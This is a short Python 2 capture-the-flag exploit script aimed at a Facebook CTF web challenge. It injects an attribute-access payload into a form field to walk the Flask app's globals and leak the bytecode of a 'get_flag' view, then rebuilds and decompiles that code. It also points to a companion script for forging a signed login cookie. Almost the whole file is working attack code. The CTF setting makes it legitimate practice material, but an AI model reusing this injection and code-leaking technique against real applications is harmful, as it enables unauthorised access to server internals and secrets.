import requests

# This scripts fetches all required properties of specified routes or function.
# It can be further utilized with uncompyle6 decompiler
# See gencookie.py for generating "user" cookie, which implements the "login" router.

r"""
code = type((lambda:1).__code__)
get_flag = code(0, 0, 2, 8, 67, b't...\x8d\x02S\x00', (None, 'admin.html', 'You have to login first.', ('text',), 'user', 'I do not recognise this user.', 'admin', 'You do not seem to be an admin, {}!', './flag'), ('current_user', 'is_authenticated', 'render_template', 'request', 'cookies', 'get', 'unsign', 'Exception', 'format', 'username', 'open', 'read'), ('user_cookie_present', 'user'), './app.py', 'get_flag', 151, b'\x00\x02\x06\x01\x0c\x02\x0c\x02\x02\x01\x0c\x01\x0e\x01\x0e\x02\x08\x01\x02\x01\x02\x01\x10\x02')

from uncompyle6.main import decompile
decompile(3.7,get_flag,sys.stdout)
"""

headers={
	'Cookie':'your cookie'
}
sess=requests.Session()
for name in 'argcount,kwonlyargcount,nlocals,stacksize,flags,codestring,constants,names,varnames,filename,name,firstlineno,lnotab'.split(','):
	if name == 'codestring':
		name = 'code'
	if name == 'constants':
		name = 'consts'
	is_repr = name in ('name', 'filename')
	r = sess.post('http://challenges.fbctf.com:8083/',headers=headers,data=dict(event_name='a',event_address='a',event_important='__init__.__globals__[app].view_functions[get_flag].__code__.co_'+name))
	assert not r.history
	data = r.content.split('<ul>')[1].split('</li>')[0].split('<li>')[1].strip()
	print '%s,'%data.replace('&#39;',"'") if not is_repr else repr(data)+',',